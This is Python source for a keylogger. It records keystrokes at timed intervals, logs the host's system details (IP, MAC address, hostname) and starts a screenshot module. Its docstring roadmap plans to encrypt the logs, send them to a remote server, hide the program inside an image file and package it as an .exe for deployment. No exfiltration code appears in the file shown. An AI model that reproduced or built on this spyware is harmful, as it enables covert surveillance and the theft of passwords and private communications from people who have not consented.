'''
Part 1:
1.Recording the keystrokes: (DONE!)
    1.1. Update the keystrokes every consecutive seconds(interval) (DONE!)
2.Capturing the system information  (DONE!)
3.Take Screenshots (DONE!)
    3.1(Not Needed at this point though): Package our .py into .exe
ISSUE: 
> There are redundant enteries in our file(RESOLVED! thanks to bokeh_joe)
Part 2:
4. Encryption of the log text file
5. Find a way to setup a remote server to send our logs
6. Embed our keylogger into an image file and deploy
7. Package and Convert our python files into a .exe file
'''

import keyboard
import time
import sys
import scrnsht
import platform,socket,re,uuid,json,psutil,logging,os

class Keylogger:

    def __init__(self, hotkey, scrnsht_interval, keystroke_interval):
        #log dictionary = {Time: a list of keystrokes}
        self.f = open('logs.txt', "a")      #storing the keystroke logs
        self.K = scrnsht.Scrnsht()
        self.info = {}
        _ = self.setSystemInfo()            #Capturing the system information
        self.log ={}
        self.hotkey = hotkey
        self.scrnsht_interval = scrnsht_interval
        self.keystroke_interval = keystroke_interval
        keyboard.add_hotkey(self.hotkey, self.killall)

    def start(self):
        '''
        Here we start the keystroke record function, screeshot record(in a background), system information capture
        '''
        self.K.start()          #Starting the screenshot Process
        self.print_sysinfo()        #Storing the sys info inside the file
        self.start_keystrokes()     #Starting to record the keystrokes
        self.update()
        # time.sleep(10)
        
    def setSystemInfo(self):
        try:
            self.info['platform']=platform.system()
            self.info['platform-release']=platform.release()
            self.info['platform-version']=platform.version()
            self.info['architecture']=platform.machine()
            self.info['hostname']=socket.gethostname()
            self.info['ip-address']=socket.gethostbyname(socket.gethostname())
            self.info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
            self.info['processor']=platform.processor()
            self.info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        except Exception as e:
            logging.exception(e)
        return self.info
    
    def print_sysinfo(self):
        #Checking if the log file is empty. We only input the system information if the log file is empty
        # f1 = open("testfile2.txt","a")
        filesize = os.path.getsize("logs.txt")
        if filesize == 0:
            print("Getting in")
            for i,j in self.info.items():
                self.f.write(i+ " "+ j+"\n")
                # print(i+" "+j+"\n")
        # f1.close()
        

    def start_keystrokes(self): #start recording the keystrokes
        keyboard.start_recording()

    def stop_keystrokes(self):
        temp = []
        temp1 = keyboard.stop_recording()           #returns a list of keystrokes
        for i in temp1:     #We filter the unnecessary stuff
            if i.event_type == "down":
                temp.append(i.name)
        logtime = time.strftime("%a, %d %b %Y %H:%M:%S",time.gmtime())
        self.log[logtime] = temp

    def updatefile(self):
        for i,j in self.log.items():    
            if len(j) == 0:         #Checking for the list of keystrokes
                continue
            self.f.write('\n'+i+":")
            for k in j:
                self.f.write(" "+k)

    def update(self):
        while True:
            try:
                time.sleep(self.keystroke_interval) #Creates a time window to keep our stuff recorded
                self.stop_keystrokes()
                if len(self.log):            #Checking the log dictionary
                    self.updatefile()
                    self.log ={}
                    #Restart the log file(to save the file's last state)
                    self.f.close()
                    self.f = open('logs.txt',"a")
                self.start_keystrokes()
            except KeyError:
                return

    def killall(self):
        self.stop_keystrokes()
        self.print_keystrokes()
        self.f.close()
        quit()

    def print_keystrokes(self):
        print(self.log)
        self.updatefile()

        

if __name__ == "__main__":
    hotkey = sys.argv[1]
    scrnsht_interval = int(sys.argv[2])
    keystroke_interval = int(sys.argv[3])

    K = Keylogger(hotkey, scrnsht_interval, keystroke_interval)
    K.start()
    # K.print_keystrokes()
    # print(K.getSystemInfo())